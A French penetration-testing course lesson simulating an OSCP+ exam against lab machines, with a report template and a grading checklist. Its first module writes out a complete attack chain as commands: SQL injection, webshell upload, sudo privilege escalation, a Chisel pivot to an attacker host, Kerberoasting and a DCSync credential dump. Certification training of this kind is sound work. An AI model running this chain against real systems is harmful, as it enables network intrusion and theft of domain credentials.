# TOME P7 — Certifications d'Élite & Spécialisations — Jour 305 (6h) : Projet Intégrateur S7 Partie 1 — OSCP+ Full Pentest Simulation (Web → AD → Pivot → Root — Rapport Professionnel)

> [!NOTE]
> **Objectif du jour :** Mettre en œuvre une **simulation complète d'examen OSCP+** de bout en bout sur une infrastructure hybride multi-machines : enchaîner un SQLi → Webshell → Reverse Shell → PrivEsc Linux → Pivot SOCKS5 Chisel → Kerberoasting AD → DCSync → Domain Admin. Rédiger un **rapport OSCP-style** complet avec captures d'écran et recommandations.
>
> **Ce projet valide la capacité de l'apprenant à mener une opération de pentest autonome et à en rédiger le rapport dans les délais OSCP.**

---

## 1) Module — Simulation OSCP+ : Phase de Reconnaissance & Exploitation Initiale (2h)

### 🛠️ Kill Chain Complète OSCP+

```bash
# ═══════════════════════════════════════════════════════
# PHASE 1 : RECONNAISSANCE
# ═══════════════════════════════════════════════════════
nmap -sV -sC -p- --min-rate 5000 -oN initial_scan.txt 192.168.50.10

# Résultat : Port 80 (Apache/PHP), Port 445 (SMB), Port 3389 (RDP)

# ═══════════════════════════════════════════════════════
# PHASE 2 : EXPLOITATION WEB (SQLi → Webshell)
# ═══════════════════════════════════════════════════════
sqlmap -u "http://192.168.50.10/product?id=1" --dbs --batch
# DB: webapp -> Table: users -> admin:$2y$10$hashed

# Upload bypass webshell.php.jpg -> ?cmd=id -> www-data

# ═══════════════════════════════════════════════════════
# PHASE 3 : PRIVILEGE ESCALATION LINUX
# ═══════════════════════════════════════════════════════
# Sudo -l -> (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit
# Root !

# ═══════════════════════════════════════════════════════
# PHASE 4 : PIVOT CHISEL → RÉSEAU INTERNE AD
# ═══════════════════════════════════════════════════════
# Sur root@machine1 : chisel client 10.10.10.100:8080 R:socks
# Sur Kali : proxychains crackmapexec smb 172.16.10.0/24

# ═══════════════════════════════════════════════════════
# PHASE 5 : ACTIVE DIRECTORY — Kerberoasting → DCSync
# ═══════════════════════════════════════════════════════
proxychains GetUserSPNs.py CORP.LOCAL/jdupont:Password123 -dc-ip 172.16.10.5 -request
hashcat -m 13100 hash.txt rockyou.txt --force
proxychains secretsdump.py CORP.LOCAL/svc_sql:SqlPass123@172.16.10.5 -just-dc
# -> krbtgt hash -> Domain Admin PWNED !
```

---

## 2) Module — Rapport de Pentest OSCP-Style (`oscp_report_template.md`) (2h30)

```markdown
# RAPPORT DE TEST D'INTRUSION — SIMULATION OSCP+
**Candidat :** [Nom Prénom]
**Date :** 2026-08-07
**Machines Compromises :** 4/5 (80%) — Score : 80 points / 100

## Executive Summary
La machine Machine1 (192.168.50.10) héberge une application web vulnérable à une injection SQL
permettant l'extraction d'identifiants et l'upload d'un webshell PHP via contournement de filtre.
La compromission du système Linux a été escaladée jusqu'à l'accès root via une mauvaise configuration sudo.
Le pivot réseau a permis l'accès au domaine Active Directory CORP.LOCAL, finalement compromis
via Kerberoasting et DCSync (extraction de tous les hashes NTLM).

## Findings

### [CRIT-01] SQL Injection — /product?id=1
- **Impact :** Extraction base de données, upload webshell, RCE
- **CVSS v3.1 :** 9.8 (Critical)
- **Recommandation :** Utiliser des requêtes préparées (Prepared Statements)

### [HIGH-02] File Upload Sans Validation Stricte
- **Impact :** Exécution de code distant (Webshell PHP)
- **CVSS v3.1 :** 8.8 (High)
- **Recommandation :** Valider l'extension ET le MIME-type réel (Magic Bytes)

### [CRIT-03] Kerberoasting — Compte svc_sql avec mot de passe faible
- **Impact :** Compromission du domaine AD (DCSync)
- **CVSS v3.1 :** 9.1 (Critical)
- **Recommandation :** Utiliser des mots de passe > 25 caractères aléatoires pour tous les comptes de service
```

---

## 3) Module — Checklist OSCP+ & Méthodologie de Notation (1h30)

```markdown
## CHECKLIST OSCP+ PENTEST (24h)

### Machines Standalone Linux/Windows (20pts chacune)
- [ ] Foothold + Preuve (local.txt) = 10pts
- [ ] Privilege Escalation + Preuve (proof.txt) = 10pts

### Active Directory Set (40pts total)
- [ ] Machine cliente AD compromise = 10pts
- [ ] Contrôleur de domaine compromis = 30pts

### Rapport (Bonus Critique)
- [ ] Captures d'écran de toutes les preuves (proof.txt avec hostname + ipconfig)
- [ ] Méthodologie de chaque exploitation documentée pas à pas
- [ ] Recommandations de remédiation

## CONSIGNES CRITIQUES OSCP
⚠️  OBLIGATOIRE : Prendre un screenshot de la preuve AVEC la commande 'ipconfig/ifconfig'
⚠️  OBLIGATOIRE : Le rapport doit être soumis dans les 24h suivant la fin de l'examen
⚠️  INTERDIT    : Utilisation d'outils automatisés non autorisés (ex: SQLMap sur l'AD set)
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **Kill Chain** | Séquence ordonnée des étapes d'une attaque, de la reconnaissance jusqu'à l'objectif final |
| **proof.txt** | Fichier de preuve de compromission root/SYSTEM à capturer dans l'examen OSCP+ |
| **PrivEsc** | Privilege Escalation — Élévation des droits d'un compte standard vers root/SYSTEM |

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
